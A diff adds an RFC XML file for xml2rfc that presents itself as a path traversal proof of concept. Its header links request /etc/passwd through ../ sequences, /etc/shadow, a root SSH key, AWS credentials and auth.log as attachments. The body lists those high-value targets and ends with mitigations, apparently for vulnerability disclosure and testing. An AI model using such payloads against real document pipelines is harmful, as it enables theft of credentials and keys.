@@ -1,0 +1,63 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rfc SYSTEM "rfc2629.dtd">
+<rfc version="3" ipr="trust200902" docName="draft-poc-traversal-00" category="info" submissionType="IETF">
+  <!-- 测试路径遍历攻击 -->
+  <link rel="attachment" href="../../../../../../etc/passwd"/>
+  <link rel="attachment" href="file:///etc/shadow"/>
+  <link rel="attachment" href="/root/.ssh/id_rsa"/>
+  <link rel="attachment" href="/home/ubuntu/.aws/credentials"/>
+  <link rel="attachment" href="/var/log/auth.log"/>
+  <front>
+    <title>POC: Path Traversal and Sensitive File Access</title>
+    <author fullname="Security Researcher" initials="S." surname="Researcher">
+      <organization>Security Research Lab</organization>
+      <address>
+        <email>security@example.com</email>
+      </address>
+    </author>
+    <date year="2025" month="November" day="22"/>
+    <abstract>
+      <t>This POC tests various path traversal techniques and attempts to access 
+      highly sensitive files including SSH keys, cloud credentials, and shadow passwords.</t>
+    </abstract>
+  </front>
+  <middle>
+    <section anchor="intro">
+      <name>Introduction</name>
+      <t>This proof of concept demonstrates advanced exploitation techniques including 
+      relative path traversal and file:// URI schemes.</t>
+    </section>
+    <section anchor="techniques">
+      <name>Attack Techniques</name>
+      <t>This POC tests the following techniques:</t>
+      <ol>
+        <li>Relative path traversal using ../../ sequences</li>
+        <li>file:// URI scheme for absolute paths</li>
+        <li>Direct absolute path references</li>
+      </ol>
+    </section>
+    <section anchor="targets">
+      <name>High-Value Targets</name>
+      <t>Attackers typically target these sensitive files:</t>
+      <ul>
+        <li>/etc/shadow - Encrypted user passwords (requires root)</li>
+        <li>/root/.ssh/id_rsa - Root SSH private key</li>
+        <li>~/.aws/credentials - AWS access keys</li>
+        <li>/var/log/auth.log - Authentication logs</li>
+        <li>Application-specific config files with database credentials</li>
+      </ul>
+    </section>
+    <section anchor="mitigation">
+      <name>Mitigation</name>
+      <t>To protect against this vulnerability:</t>
+      <ol>
+        <li>Upgrade to xml2rfc version 3.30.2 or later immediately</li>
+        <li>Validate all user-provided XML input</li>
+        <li>Run xml2rfc in a sandboxed environment with limited file access</li>
+        <li>Implement file access monitoring and alerting</li>
+        <li>Apply principle of least privilege to the xml2rfc process</li>
+      </ol>
+    </section>
+  </middle>
+  <back/>
+</rfc>
